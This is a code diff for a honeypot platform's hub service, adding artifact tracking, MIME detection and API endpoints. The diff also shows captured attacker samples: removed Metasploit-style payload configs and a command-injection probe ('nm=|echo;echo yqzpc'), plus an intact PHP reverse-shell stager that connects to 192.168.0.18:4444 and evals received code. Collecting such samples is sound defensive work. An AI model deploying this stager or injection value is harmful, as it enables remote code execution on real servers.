-### `honeypot-platform/hub/Dockerfile`  _(~0.2 KB; showing ≤800 lines)_
+### `honeypot-platform/hub/Dockerfile`  _(~0.6 KB; showing ≤800 lines)_
 ```
+FROM node:20-alpine AS webui-build
+WORKDIR /webui
+COPY webui/package.json webui/package-lock.json* ./
+RUN if [ -f package-lock.json ]; then npm ci; else npm install; fi
+COPY webui/ ./
+RUN npm run build
+
 FROM python:3.11-slim
 WORKDIR /app
+COPY requirements.txt /app/requirements.txt
+RUN apt-get update && apt-get install -y --no-install-recommends libmagic1 && rm -rf /var/lib/apt/lists/*
+RUN pip install --no-cache-dir -r /app/requirements.txt
 COPY app /app/app
-RUN pip install --no-cache-dir fastapi uvicorn jinja2
+COPY --from=webui-build /webui/dist /app/app/webui_dist
 CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000"]
 ```
 
-### `honeypot-platform/hub/app/db.py`  _(~2.2 KB; showing ≤800 lines)_
+### `honeypot-platform/hub/app/db.py`  _(~9.4 KB; showing ≤800 lines)_
 ```python
 import json
 import sqlite3
+from dataclasses import dataclass
 from pathlib import Path
+
+
+@dataclass
+class BlobMeta:
+    sha256: str
+    size: int | None
+    detected_mime: str | None
+    detected_desc: str | None
+    guessed_ext: str | None
+    detected_at: str
+    meta_json: str | None = None
 
 
 class HubDB:
@@ -2952,6 +3040,7 @@ class HubDB:
         self.path = path
         self.path.parent.mkdir(parents=True, exist_ok=True)
         self.conn = sqlite3.connect(str(path), check_same_thread=False)
+        self.conn.row_factory = sqlite3.Row
         self.conn.execute(
             """
             create table if not exists events(
@@ -2979,15 +3068,51 @@ class HubDB:
             )
             """
         )
+        self.conn.execute(
+            """
+            create table if not exists artifacts(
+              artifact_id text primary key,
+              event_id text,
+              honeypot_id text,
+              session_id text,
+              ts text,
+              kind text,
+              sha256 text,
+              size integer,
+              mime text,
+              storage_ref text,
+              meta_json text
+            )
+            """
+        )
+        self.conn.execute(
+            """
+            create table if not exists blob_meta(
+              sha256 text primary key,
+              size integer,
+              detected_mime text,
+              detected_desc text,
+              guessed_ext text,
+              detected_at text,
+              meta_json text
+            )
+            """
+        )
+        self.conn.execute("create index if not exists idx_artifacts_hs_ts on artifacts(honeypot_id, session_id, ts)")
+        self.conn.execute("create index if not exists idx_artifacts_sha on artifacts(sha256)")
+        self.conn.execute("create index if not exists idx_artifacts_ts on artifacts(ts)")
+        self.conn.execute("create index if not exists idx_blob_meta_mime on blob_meta(detected_mime)")
+        self.conn.execute("create index if not exists idx_blob_meta_detected_at on blob_meta(detected_at)")
         self.conn.commit()
 
     def insert_event(self, event: dict):
+        honeypot_id = event.get("honeypot_id") or event.get("pack_id")
         tags = event.get("classification", {}).get("tags", [])
         self.conn.execute(
             "insert or replace into events(event_id,honeypot_id,session_id,ts,event_name,component,verdict,tags,raw_json) values(?,?,?,?,?,?,?,?,?)",
             (
                 event.get("event_id"),
-                event.get("honeypot_id") or event.get("pack_id"),
+                honeypot_id,
                 event.get("session_id"),
                 event.get("ts"),
                 event.get("event_name"),
@@ -3001,35 +3126,256 @@ class HubDB:
             "insert into sessions(honeypot_id,session_id,agent_id,started_ts,last_seen_ts) values(?,?,?,?,?) "
             "on conflict(honeypot_id,session_id) do update set last_seen_ts=excluded.last_seen_ts",
             (
-                event.get("honeypot_id") or event.get("pack_id"),
+                honeypot_id,
                 event.get("session_id"),
                 event.get("agent_id"),
                 event.get("ts"),
                 event.get("ts"),
             ),
         )
+        self._insert_artifacts_for_event(event)
         self.conn.commit()
+
+    def _insert_artifacts_for_event(self, event: dict):
+        event_id = event.get("event_id")
+        artifacts = event.get("artifacts") or []
+        if not event_id or not isinstance(artifacts, list):
+            return
+
+        for i, artifact in enumerate(artifacts):
+            if not isinstance(artifact, dict):
+                continue
+            self.conn.execute(
+                """
+                insert or replace into artifacts(
+                  artifact_id,event_id,honeypot_id,session_id,ts,kind,sha256,size,mime,storage_ref,meta_json
+                ) values(?,?,?,?,?,?,?,?,?,?,?)
+                """,
+                (
+                    f"{event_id}:{i}",
+                    event_id,
+                    event.get("honeypot_id") or event.get("pack_id"),
+                    event.get("session_id"),
+                    event.get("ts"),
+                    artifact.get("kind"),
+                    artifact.get("sha256"),
+                    artifact.get("size"),
+                    artifact.get("mime"),
+                    artifact.get("storage_ref"),
+                    json.dumps(artifact.get("meta") or {}),
+                ),
+            )
+
+    def artifacts_count(self) -> int:
+        row = self.conn.execute("select count(*) as c from artifacts").fetchone()
+        return int(row["c"] if row else 0)
+
+    def backfill_artifacts(self, limit: int | None = None):
+        sql = "select raw_json from events order by ts desc"
+        params: list[int] = []
+        if limit:
+            sql += " limit ?"
+            params.append(limit)
+
+        for row in self.conn.execute(sql, params):
+            try:
+                event = json.loads(row["raw_json"])
+            except json.JSONDecodeError:
+                continue
+            self._insert_artifacts_for_event(event)
+        self.conn.commit()
+
+    def upsert_blob_meta(self, meta: BlobMeta) -> None:
+        self.conn.execute(
+            """
+            insert into blob_meta(sha256,size,detected_mime,detected_desc,guessed_ext,detected_at,meta_json)
+            values(?,?,?,?,?,?,?)
+            on conflict(sha256) do update set
+              size=excluded.size,
+              detected_mime=excluded.detected_mime,
+              detected_desc=excluded.detected_desc,
+              guessed_ext=excluded.guessed_ext,
+              detected_at=excluded.detected_at,
+              meta_json=excluded.meta_json
+            """,
+            (
+                meta.sha256,
+                meta.size,
+                meta.detected_mime,
+                meta.detected_desc,
+                meta.guessed_ext,
+                meta.detected_at,
+                meta.meta_json,
+            ),
+        )
+        self.conn.commit()
+
+    def get_blob_meta(self, sha256: str) -> BlobMeta | None:
+        row = self.conn.execute(
+            "select sha256,size,detected_mime,detected_desc,guessed_ext,detected_at,meta_json from blob_meta where sha256=?",
+            (sha256,),
+        ).fetchone()
+        if not row:
+            return None
+        return BlobMeta(
+            sha256=row["sha256"],
+            size=row["size"],
+            detected_mime=row["detected_mime"],
+            detected_desc=row["detected_desc"],
+            guessed_ext=row["guessed_ext"],
+            detected_at=row["detected_at"],
+            meta_json=row["meta_json"],
+        )
+
+    def list_blob_shas_missing_meta(self, limit: int) -> list[str]:
+        rows = self.conn.execute(
+            """
+            select a.sha256
+            from artifacts a
+            left join blob_meta bm on bm.sha256 = a.sha256
+            where a.sha256 is not null and bm.sha256 is null
+            group by a.sha256
+            limit ?
+            """,
+            (limit,),
+        ).fetchall()
+        return [row["sha256"] for row in rows]
+
+    def get_blob_meta_many(self, shas: list[str]) -> dict[str, BlobMeta]:
+        unique_shas = sorted({sha for sha in shas if sha})
+        if not unique_shas:
+            return {}
+
+        placeholders = ",".join("?" for _ in unique_shas)
+        rows = self.conn.execute(
+            f"""
+            select sha256,size,detected_mime,detected_desc,guessed_ext,detected_at,meta_json
+            from blob_meta
+            where sha256 in ({placeholders})
+            """,
+            unique_shas,
+        ).fetchall()
+        return {
+            row["sha256"]: BlobMeta(
+                sha256=row["sha256"],
+                size=row["size"],
+                detected_mime=row["detected_mime"],
+                detected_desc=row["detected_desc"],
+                guessed_ext=row["guessed_ext"],
+                detected_at=row["detected_at"],
+                meta_json=row["meta_json"],
+            )
+            for row in rows
+        }
+
+    def get_event_artifact_mimes(self, event_ids: list[str]) -> dict[str, list[str]]:
+        unique_ids = sorted({event_id for event_id in event_ids if event_id})
+        if not unique_ids:
+            return {}
+
+        placeholders = ",".join("?" for _ in unique_ids)
+        rows = self.conn.execute(
+            f"""
+            select
+              a.event_id,
+              coalesce(m.detected_mime, a.mime, 'application/octet-stream') as mime,
+              count(*) as c
+            from artifacts a
+            left join blob_meta m on m.sha256 = a.sha256
+            where a.event_id in ({placeholders})
+            group by a.event_id, mime
+            """,
+            unique_ids,
+        ).fetchall()
+
+        by_event: dict[str, list[str]] = {event_id: [] for event_id in unique_ids}
+        for row in rows:
+            by_event[row["event_id"]].extend([row["mime"]] * int(row["c"] or 0))
+        return by_event
 ```
 
-### `honeypot-platform/hub/app/main.py`  _(~3.4 KB; showing ≤800 lines)_
+### `honeypot-platform/hub/app/filetype.py`  _(~1.2 KB; showing ≤800 lines)_
 ```python
-import hashlib
-import json
-import os
+import logging
+import mimetypes
 from pathlib import Path
 
-from fastapi import FastAPI, Header, HTTPException, Request
-from fastapi.responses import FileResponse, HTMLResponse
-from fastapi.templating import Jinja2Templates
+logger = logging.getLogger(__name__)
 
-from .db import HubDB
+try:
+    import magic
+except Exception:  # pragma: no cover - optional dependency behavior
+    magic = None
+
+
+def detect_blob(path: Path, *, max_bytes: int = 262144) -> dict[str, str | None]:
+    with path.open("rb") as handle:
+        buf = handle.read(max(1, max_bytes))
+
+    detected_mime: str | None = None
+    detected_desc: str | None = None
+
+    if magic is not None:
+        try:
+            detected_mime = magic.from_buffer(buf, mime=True)
+            detected_desc = magic.from_buffer(buf, mime=False)
+        except Exception as exc:  # pragma: no cover - defensive fallback
+            logger.warning("filetype detection failed for %s: %s", path, exc)
+
+    if not detected_mime:
+        guessed_mime = mimetypes.guess_type(str(path))[0]
+        detected_mime = guessed_mime or "application/octet-stream"
+    if not detected_desc:
+        detected_desc = "data"
+
+    guessed_ext = mimetypes.guess_extension(detected_mime or "")
+    if guessed_ext and guessed_ext.startswith("."):
+        guessed_ext = guessed_ext[1:]
+
+    return {
+        "detected_mime": detected_mime,
+        "detected_desc": detected_desc,
+        "guessed_ext": guessed_ext,
+    }
+```
+
+### `honeypot-platform/hub/app/main.py`  _(~17.7 KB; showing ≤800 lines)_
+```python
+import asyncio
+import hashlib
+import json
+import logging
+import os
+from contextlib import suppress
+from datetime import UTC, datetime
+from pathlib import Path
+from urllib.parse import urlparse
+
+from fastapi import FastAPI, Header, HTTPException, Request
+from fastapi.responses import FileResponse, RedirectResponse, StreamingResponse
+
+from .db import BlobMeta, HubDB
+from .filetype import detect_blob
 
 DATA = Path(os.getenv("HOHO_HUB_DATA", "./data"))
 BLOBS = DATA / "blobs"
 TOKEN =[REDACTED]
+BACKFILL_ENABLED = os.getenv("HOHO_HUB_BACKFILL", "0") == "1"
+FILETYPE_DETECT_ENABLED = os.getenv("HOHO_HUB_FILETYPE_DETECT", "1") == "1"
+FILETYPE_DETECT_MAX_BYTES = max(1, int(os.getenv("HOHO_HUB_FILETYPE_DETECT_MAX_BYTES", "262144")))
+FILETYPE_LAZY = os.getenv("HOHO_HUB_FILETYPE_LAZY", "0") == "1"
+FILETYPE_BACKFILL_ENABLED = os.getenv("HOHO_HUB_FILETYPE_BACKFILL", "0") == "1"
+FILETYPE_BACKFILL_LIMIT = max(1, int(os.getenv("HOHO_HUB_FILETYPE_BACKFILL_LIMIT", "100")))
+WEBUI_DIST = Path(__file__).parent / "webui_dist"
+
+logger = logging.getLogger(__name__)
+
 DB = HubDB(DATA / "hub.db")
+if BACKFILL_ENABLED or DB.artifacts_count() == 0:
+    DB.backfill_artifacts()
+
 app = FastAPI()
-templates = Jinja2Templates(directory=str(Path(__file__).parent / "templates"))
+_SUBSCRIBERS: set[asyncio.Queue] = set()
 
 
 def _auth(authorization: [REDACTED]
@@ -3040,22 +3386,170 @@ def _auth(authorization: [REDACTED]
         raise HTTPException(status_code=401, detail="unauthorized")
 
 
+def _event_summary(event: dict) -> dict:
+    artifacts = (event.get("artifacts") or []) if isinstance(event.get("artifacts"), list) else []
+    return {
+        "event_id": event.get("event_id"),
+        "ts": event.get("ts"),
+        "honeypot_id": event.get("honeypot_id") or event.get("pack_id"),
+        "session_id": event.get("session_id"),
+        "event_name": event.get("event_name"),
+        "component": event.get("component"),
+        "verdict": (event.get("classification") or {}).get("verdict"),
+        "tags": (event.get("classification") or {}).get("tags") or [],
+        "artifacts_count": len(artifacts),
+        "artifact_badges": _artifact_badges_for_artifacts(artifacts),
+    }
+
+
+def _bucket_mime(mime: str | None) -> str:
+    m = (mime or "application/octet-stream").lower()
+    if m.startswith("text/"):
+        return "text"
+    if m.startswith("image/"):
+        return "image"
+    if m in {"application/x-executable", "application/x-sharedlib", "application/x-mach-binary"}:
+        return "exe"
+    if m in {"application/zip", "application/x-tar", "application/gzip", "application/x-7z-compressed", "application/x-rar"}:
+        return "archive"
+    return "binary"
+
+
+def _artifact_badges_for_artifacts(artifacts: list[dict]) -> list[str]:
+    badges: list[str] = []
+    for artifact in artifacts:
+        if not isinstance(artifact, dict):
+            continue
+        badge = _bucket_mime(str(artifact.get("detected_mime") or artifact.get("mime") or ""))
+        if badge not in badges:
+            badges.append(badge)
+    return badges
+
+
+def _artifact_badges_from_mimes(mimes: list[str]) -> list[str]:
+    badges: list[str] = []
+    for mime in mimes:
+        badge = _bucket_mime(mime)
+        if badge not in badges:
+            badges.append(badge)
+    return badges
+
+
+def _enrich_artifacts(artifacts: list[dict]) -> list[dict]:
+    shas = [str(a.get("sha256")) for a in artifacts if isinstance(a, dict) and a.get("sha256")]
+    meta_by_sha = DB.get_blob_meta_many(shas)
+    enriched: list[dict] = []
+    for artifact in artifacts:
+        if not isinstance(artifact, dict):
+            continue
+        item = dict(artifact)
+        sha = str(item.get("sha256") or "")
+        meta = meta_by_sha.get(sha)
+        if meta:
+            item["detected_mime"] = meta.detected_mime
+            item["detected_desc"] = meta.detected_desc
+            item["guessed_ext"] = meta.guessed_ext
+        enriched.append(item)
+    return enriched
+
+
+def _publish_event(summary: dict):
+    stale = []
+    for queue in _SUBSCRIBERS:
+        try:
+            queue.put_nowait(summary)
+        except asyncio.QueueFull:
+            stale.append(queue)
+    for queue in stale:
+        _SUBSCRIBERS.discard(queue)
+
+
+def _blob_path(sha: str) -> Path:
+    return BLOBS / sha[:2] / sha
+
+
+def _blob_meta_to_dict(meta: BlobMeta) -> dict[str, str | int | None]:
+    return {
+        "sha256": meta.sha256,
+        "size": meta.size,
+        "detected_mime": meta.detected_mime,
+        "detected_desc": meta.detected_desc,
+        "guessed_ext": meta.guessed_ext,
+        "detected_at": meta.detected_at,
+    }
+
+
+def _detect_and_store_blob_meta(sha: str, path: Path, size: int | None = None) -> BlobMeta | None:
+    if not FILETYPE_DETECT_ENABLED:
+        return None
+
+    try:
+        detected = detect_blob(path, max_bytes=FILETYPE_DETECT_MAX_BYTES)
+        meta = BlobMeta(
+            sha256=sha,
+            size=size,
+            detected_mime=detected.get("detected_mime"),
+            detected_desc=detected.get("detected_desc"),
+            guessed_ext=detected.get("guessed_ext"),
+            detected_at=datetime.now(UTC).isoformat(),
+            meta_json=None,
+        )
+        DB.upsert_blob_meta(meta)
+        return meta
+    except Exception as exc:  # pragma: no cover - upload path must not break
+        logger.warning("blob metadata detection failed for %s: %s", sha, exc)
+        return None
+
+
+def _ensure_blob_meta(sha: str, size: int | None = None) -> BlobMeta | None:
+    if not sha:
+        return None
+
+    meta = DB.get_blob_meta(sha)
+    if meta:
+        return meta
+    if not FILETYPE_DETECT_ENABLED or not FILETYPE_LAZY:
+        return None
+
+    path = _blob_path(sha)
+    if not path.exists():
+        return None
+    return _detect_and_store_blob_meta(sha, path, size=size)
+
+
+def _backfill_blob_meta():
+    if not FILETYPE_DETECT_ENABLED or not FILETYPE_BACKFILL_ENABLED:
+        return
+    for sha in DB.list_blob_shas_missing_meta(FILETYPE_BACKFILL_LIMIT):
+        path = _blob_path(sha)
+        if not path.exists():
+            continue
+        _detect_and_store_blob_meta(sha, path, size=path.stat().st_size)
+
+
+_backfill_blob_meta()
+
+
 @app.put("/api/v1/blobs/{sha}")
 async def put_blob(sha: str, request: Request, authorization: str | None =[REDACTED]
 [REDACTED]
     data = await request.body()
     if hashlib.sha256(data).hexdigest() != sha:
         raise HTTPException(status_code=400, detail="sha mismatch")
-    p = BLOBS / sha[:2] / sha
+    p = _blob_path(sha)
     p.parent.mkdir(parents=True, exist_ok=True)
     if not p.exists():
         p.write_bytes(data)
+
+    if FILETYPE_DETECT_ENABLED and not FILETYPE_LAZY:
+        _detect_and_store_blob_meta(sha, p, size=len(data))
+
     return {"ok": True}
 
 
 @app.head("/api/v1/blobs/{sha}")
 def head_blob(sha: str):
-    p = BLOBS / sha[:2] / sha
+    p = _blob_path(sha)
     if not p.exists():
         raise HTTPException(status_code=404)
     return {}
@@ -3067,37 +3561,317 @@ def post_event(event: dict, authorization: str | None =[REDACTED]
     if "honeypot_id" not in event and "pack_id" in event:
         event["honeypot_id"] = event["pack_id"]
     DB.insert_event(event)
+    _publish_event(_event_summary(event))
     return {"ok": True}
 
 
-@app.get("/", response_class=HTMLResponse)
-def index(request: Request):
-    rows = DB.conn.execute("select distinct honeypot_id from events order by honeypot_id").fetchall()
-    return templates.TemplateResponse("index.html", {"request": request, "rows": rows})
+@app.get("/api/v1/honeypots")
+def list_honeypots(limit: int = 200):
+    limit = max(1, min(limit, 1000))
+    rows = DB.conn.execute(
+        """
+        select honeypot_id,
+               max(ts) as last_seen_ts,
+               count(distinct session_id) as sessions_count,
+               count(*) as events_count
+        from events
+        group by honeypot_id
+        order by last_seen_ts desc
+        limit ?
+        """,
+        (limit,),
+    ).fetchall()
+    return [dict(row) for row in rows]
 
 
-@app.get("/honeypots/{honeypot_id}", response_class=HTMLResponse)
-def sessions(request: Request, honeypot_id: str):
-    rows = DB.conn.execute("select session_id, agent_id, started_ts, last_seen_ts from sessions where honeypot_id=? order by last_seen_ts desc", (honeypot_id,)).fetchall()
-    return templates.TemplateResponse("sessions.html", {"request": request, "honeypot_id": honeypot_id, "rows": rows})
+@app.get("/api/v1/honeypots/{honeypot_id}/sessions")
+def list_sessions(honeypot_id: str, limit: int = 200):
+    limit = max(1, min(limit, 1000))
+    rows = DB.conn.execute(
+        """
+        select session_id, agent_id, started_ts, last_seen_ts
+        from sessions
+        where honeypot_id=?
+        order by last_seen_ts desc
+        limit ?
+        """,
+        (honeypot_id, limit),
+    ).fetchall()
+    return [dict(row) for row in rows]
 
 
-@app.get("/honeypots/{honeypot_id}/sessions/{session_id}", response_class=HTMLResponse)
-def events(request: Request, honeypot_id: str, session_id: str):
-    rows = DB.conn.execute("select event_id, ts, event_name, component, verdict from events where honeypot_id=? and session_id=? order by ts desc", (honeypot_id, session_id)).fetchall()
-    return templates.TemplateResponse("events.html", {"request": request, "honeypot_id": honeypot_id, "session_id": session_id, "rows": rows})
+@app.get("/api/v1/honeypots/{honeypot_id}/sessions/{session_id}/events")
+def list_session_events(honeypot_id: str, session_id: str, before_ts: str | None = None, limit: int = 200):
+    limit = max(1, min(limit, 1000))
+    params: list[str | int] = [honeypot_id, session_id]
+    q = """
+        select event_id, ts, event_name, component, verdict, tags
+        from events
+        where honeypot_id=? and session_id=?
+    """
+    if before_ts:
+        q += " and ts < ?"
+        params.append(before_ts)
+    q += " order by ts desc limit ?"
+    params.append(limit)
+    rows = DB.conn.execute(q, params).fetchall()
+    event_ids = [str(row["event_id"]) for row in rows if row["event_id"]]
+    mimes_by_event = DB.get_event_artifact_mimes(event_ids)
+    out = []
+    for row in rows:
+        item = dict(row)
+        item["tags"] = json.loads(item.get("tags") or "[]")
+        item["artifact_badges"] = _artifact_badges_from_mimes(mimes_by_event.get(item["event_id"], []))
+        out.append(item)
+    return out
 
 
-@app.get("/events/{event_id}", response_class=HTMLResponse)
-def event_detail(request: Request, event_id: str):
+@app.get("/api/v1/events")
+def list_events(limit: int = 200):
+    limit = max(1, min(limit, 1000))
+    rows = DB.conn.execute(
+        """
+        select event_id, ts, honeypot_id, session_id, event_name, component, verdict, tags
+        from events
+        order by ts desc
+        limit ?
+        """,
+        (limit,),
+    ).fetchall()
+    event_ids = [str(row["event_id"]) for row in rows if row["event_id"]]
+    mimes_by_event = DB.get_event_artifact_mimes(event_ids)
+    out = []
+    for row in rows:
+        item = dict(row)
+        item["tags"] = json.loads(item.get("tags") or "[]")
+        item["artifacts_count"] = len(mimes_by_event.get(item["event_id"], []))
+        item["artifact_badges"] = _artifact_badges_from_mimes(mimes_by_event.get(item["event_id"], []))
+        out.append(item)
+    return out
+
+
+@app.get("/api/v1/events/{event_id}")
+def get_event(event_id: str):
     row = DB.conn.execute("select raw_json from events where event_id=?", (event_id,)).fetchone()
-    event = json.loads(row[0]) if row else {}
-    return templates.TemplateResponse("event.html", {"request": request, "event": event})
+    if not row:
+        raise HTTPException(status_code=404, detail="event not found")
+    event = json.loads(row["raw_json"])
+    artifacts = (event.get("artifacts") or []) if isinstance(event.get("artifacts"), list) else []
+    event["artifacts"] = _enrich_artifacts(artifacts)
+    return event
+
+
+@app.get("/api/v1/events/{event_id}/artifacts")
+def get_event_artifacts(event_id: str):
+    row = DB.conn.execute("select raw_json from events where event_id=?", (event_id,)).fetchone()
+    if not row:
+        raise HTTPException(status_code=404, detail="event not found")
+    event = json.loads(row["raw_json"])
+    artifacts = (event.get("artifacts") or []) if isinstance(event.get("artifacts"), list) else []
+    return _enrich_artifacts(artifacts)
+
+
+@app.get("/api/v1/artifacts")
+def list_artifacts(
+    honeypot_id: str | None = None,
+    session_id: str | None = None,
+    kind: str | None = None,
+    mime_prefix: str | None = None,
+    detected_mime_prefix: str | None = None,
+    q: str | None = None,
+    limit: int = 200,
+    offset: int = 0,
+):
+    limit = max(1, min(limit, 1000))
+    offset = max(0, offset)
+    clauses = []
+    params: list[str | int] = []
+
+    if honeypot_id:
+        clauses.append("a.honeypot_id=?")
+        params.append(honeypot_id)
+    if session_id:
+        clauses.append("a.session_id=?")
+        params.append(session_id)
+    if kind:
+        clauses.append("a.kind=?")
+        params.append(kind)
+    if mime_prefix:
+        clauses.append("a.mime like ?")
+        params.append(f"{mime_prefix}%")
+    if detected_mime_prefix:
+        clauses.append("bm.detected_mime like ?")
+        params.append(f"{detected_mime_prefix}%")
+    if q:
+        clauses.append("(a.event_id like ? or a.sha256 like ? or a.storage_ref like ? or a.meta_json like ?)")
+        like = f"%{q}%"
+        params.extend([like, like, like, like])
+
+    sql = """
+        select
+            a.artifact_id,
+            a.ts,
+            a.honeypot_id,
+            a.session_id,
+            a.event_id,
+            a.kind,
+            a.sha256,
+            a.size,
+            a.mime,
+            a.storage_ref,
+            a.meta_json,
+            bm.detected_mime,
+            bm.detected_desc,
+            bm.guessed_ext
+        from artifacts a
+        left join blob_meta bm on bm.sha256 = a.sha256
+    """
+    if clauses:
+        sql += " where " + " and ".join(clauses)
+    sql += " order by a.ts desc limit ? offset ?"
+    params.extend([limit, offset])
+
+    rows = DB.conn.execute(sql, params).fetchall()
+    out = []
+    for row in rows:
+        detected_mime = row["detected_mime"]
+        detected_desc = row["detected_desc"]
+        guessed_ext = row["guessed_ext"]
+
+        sha = row["sha256"]
+        if sha and FILETYPE_LAZY and not detected_mime and not detected_desc:
+            detected = _ensure_blob_meta(sha, size=row["size"])
+            if detected:
+                detected_mime = detected.detected_mime
+                detected_desc = detected.detected_desc
+                guessed_ext = detected.guessed_ext
+
+        out.append(
+            {
+                "artifact_id": row["artifact_id"],
+                "ts": row["ts"],
+                "honeypot_id": row["honeypot_id"],
+                "session_id": row["session_id"],
+                "event_id": row["event_id"],
+                "kind": row["kind"],
+                "sha256": sha,
+                "size": row["size"],
+                "mime": row["mime"],
+                "storage_ref": row["storage_ref"],
+                "meta": json.loads(row["meta_json"] or "{}"),
+                "detected_mime": detected_mime,
+                "detected_desc": detected_desc,
+                "guessed_ext": guessed_ext,
+            }
+        )
+    return out
+
+
+@app.get("/api/v1/blobs/{sha}/meta")
+def get_blob_meta(sha: str):
+    meta = DB.get_blob_meta(sha)
+    if not meta and FILETYPE_LAZY:
+        path = _blob_path(sha)
+        if path.exists():
+            meta = _detect_and_store_blob_meta(sha, path, size=path.stat().st_size)
+    if not meta:
+        raise HTTPException(status_code=404, detail="blob metadata not found")
+    return _blob_meta_to_dict(meta)
+
+
+@app.get("/api/v1/artifacts/{artifact_id}/download")
+def download_artifact(artifact_id: str):
+    row = DB.conn.execute("select kind, sha256, meta_json from artifacts where artifact_id=?", (artifact_id,)).fetchone()
+    if not row:
+        raise HTTPException(status_code=404, detail="artifact not found")
+    sha = row["sha256"]
+    if not sha:
+        raise HTTPException(status_code=404, detail="artifact has no blob hash")
+
+    p = _blob_path(sha)
+    if not p.exists():
+        raise HTTPException(status_code=404, detail="blob not found")
+
+    meta = json.loads(row["meta_json"] or "{}")
+    filename = meta.get("filename")
+    if not filename and meta.get("url"):
+        parsed = urlparse(meta["url"])
+        segment = Path(parsed.path).name
+        if segment:
+            filename = segment
+    if not filename:
+        filename = f"{row['kind'] or 'artifact'}_{sha[:8]}.bin"
+    return FileResponse(str(p), filename=filename)
+
+
+@app.get("/api/v1/stream/events")
+async def stream_events(honeypot_id: str | None = None, session_id: str | None = None, since_ts: str | None = None):
+    def matches(evt: dict) -> bool:
+        if honeypot_id and evt.get("honeypot_id") != honeypot_id:
+            return False
+        if session_id and evt.get("session_id") != session_id:
+            return False
+        return True
+
+    async def event_stream():
+        if since_ts:
+            rows = DB.conn.execute(
+                """
+                select event_id, ts, honeypot_id, session_id, event_name, component, verdict, tags
+                from events
+                where ts >= ?
+                order by ts desc
+                limit 200
+                """,
+                (since_ts,),
+            ).fetchall()
+            event_ids = [str(row["event_id"]) for row in rows if row["event_id"]]
+            mimes_by_event = DB.get_event_artifact_mimes(event_ids)
+            for row in reversed(rows):
+                payload = dict(row)
+                payload["tags"] = json.loads(payload.get("tags") or "[]")
+                payload["artifacts_count"] = len(mimes_by_event.get(payload["event_id"], []))
+                payload["artifact_badges"] = _artifact_badges_from_mimes(mimes_by_event.get(payload["event_id"], []))
+                if matches(payload):
+                    yield f"data: {json.dumps(payload, separators=(',', ':'))}\n\n"
+
+        queue: asyncio.Queue = asyncio.Queue(maxsize=500)
+        _SUBSCRIBERS.add(queue)
+        try:
+            while True:
+                try:
+                    evt = await asyncio.wait_for(queue.get(), timeout=15)
+                    if matches(evt):
+                        yield f"data: {json.dumps(evt, separators=(',', ':'))}\n\n"
+                except asyncio.TimeoutError:
+                    yield ": ping\n\n"
+        finally:
+            _SUBSCRIBERS.discard(queue)
+
+    return StreamingResponse(event_stream(), media_type="text/event-stream")
+
+
+@app.get("/")
+def home_redirect():
+    return RedirectResponse(url="/ui/")
+
+
+@app.get("/ui/{path:path}", include_in_schema=False)
+def serve_ui(path: str):
+    if not WEBUI_DIST.exists():
+        raise HTTPException(status_code=404, detail="web ui not built")
+
+    target = (WEBUI_DIST / path).resolve()
+    with suppress(ValueError):
+        target.relative_to(WEBUI_DIST.resolve())
+        if target.is_file():
+            return FileResponse(str(target))
+    return FileResponse(str(WEBUI_DIST / "index.html"))
 
 
 @app.get("/blobs/{sha}")
 def download_blob(sha: str):
-    p = BLOBS / sha[:2] / sha
+    p = _blob_path(sha)
     if not p.exists():
         raise HTTPException(status_code=404)
     return FileResponse(str(p), filename=sha)
@@ -3126,43 +3900,9 @@ def download_blob(sha: str):
 <ul>{% for r in rows %}<li><a href="/honeypots/{{honeypot_id}}/sessions/{{r[0]}}">{{r[0]}}</a> ({{r[1]}})</li>{% endfor %}</ul>
 ```
 
-### `honeypot-platform/hub/data/blobs/14/14f2253af3578fbae7a588920fe61a8c3252551e243459c62e5811212dda2aab`  _(~0.2 KB; showing ≤800 lines)_
-```
-#start.jar properties
-#Wed Feb 11 14:53:14 UTC 2026
-java.version=1.8.0_151
-java.version.revision=0
-java.version.major=1
-java.version.minor=8
-java.version.update=151
-```
-
-### `honeypot-platform/hub/data/blobs/34/344adeebfdcf3485a70181c2255ee7ef49c92303addec28517778934667e6375`  _(~0.1 KB; showing ≤800 lines)_
-```
-#
-#Wed Feb 11 14:53:30 UTC 2026
-Spawn=0
-LPORT=4444
-LHOST=192.168.0.18
-```
-
-### `honeypot-platform/hub/data/blobs/52/52fd670910f16c52a5d6e9d7e875e32d693a6470b3ad1ebf450d847af9fe41a6`  _(~0.0 KB; showing ≤800 lines)_
-```
-nm=|echo;echo yqzpc
-```
-
 ### `honeypot-platform/hub/data/blobs/6b/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b`  _(~0.0 KB; showing ≤800 lines)_
 ```
 1
-```
-
-### `honeypot-platform/hub/data/blobs/74/74880fe5f19e4a720e1215939b81abef4fcbbb01201026df173532b6b5b729c7`  _(~0.1 KB; showing ≤800 lines)_
-```
-#
-#Wed Feb 11 14:53:30 UTC 2026
-Spawn=1
-LPORT=4444
-LHOST=192.168.0.18
 ```
 
 ### `honeypot-platform/hub/data/blobs/99/996813623c4a172be25c35c15793237abb23aa94732155c0055c07f74bfc8e08`  _(~1.1 KB; showing ≤800 lines)_
@@ -3170,32 +3910,9 @@ LHOST=192.168.0.18
 /*<?php /**/ error_reporting(0); $ip = '192.168.0.18'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
 ```
 
-### `honeypot-platform/hub/data/blobs/d9/d9be63e5588f20632a3fcdcc3de8864e3ff4d343ab1b35f2ad7a8324b5f2b5bb`  _(~0.1 KB; showing ≤800 lines)_
-```
